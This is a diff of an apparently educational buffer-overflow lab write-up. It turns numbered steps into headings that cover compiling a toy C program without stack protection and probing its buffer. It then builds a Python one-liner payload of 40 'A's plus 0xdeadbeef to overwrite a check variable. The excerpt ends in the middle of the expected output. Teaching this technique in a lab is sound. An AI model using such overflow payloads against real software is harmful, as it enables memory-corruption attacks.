@@ -81,12 +81,12 @@ void main(int argc, char *argv[])
    }
 }
 ```
-Step 1: Compile the program
+###Step 1: Compile the program
 First, ensure the program is compiled without stack protection and with debugging information. You can use the following command:
 ```gcc -o buffer_overflow buffer_overflow.c -fno-stack-protector -z execstack -g```
-Step 2: Run the program
+###Step 2: Run the program
 ```./bof2```
-Step 3: Check the buffer size
+###Step 3: Check the buffer size
 You can do this by input some random things, for example: 
 ```ruby
 /mnt/d/uni/2025/info/seclabs/bof $ ./bof2
@@ -94,18 +94,18 @@ test input
 [buf]: test input
 [check] 0x4030201
 ```
-Step 4: Create a exploit input
+###Step 4: Create a exploit input
 You need to construct an input that:
     - Fills buf with 40 characters.
     - Overwrites check with the value 0xdeadbeef in little-endian format.
-Step 5: Generate the input
+###Step 5: Generate the input
 ```python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' > exploit_input```
 This command creates a file named exploit_input containing:
     - 40 'A's (filling buf)
     - The bytes ef be ad de (overwriting check)
-Step 6: run the program with exploit input
+###Step 6: run the program with exploit input
 ```./bof2 < exploit_input```
-Step 7: Check the output
+###Step 7: Check the output
 If successful, you get this: 
 ```ruby
 [buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
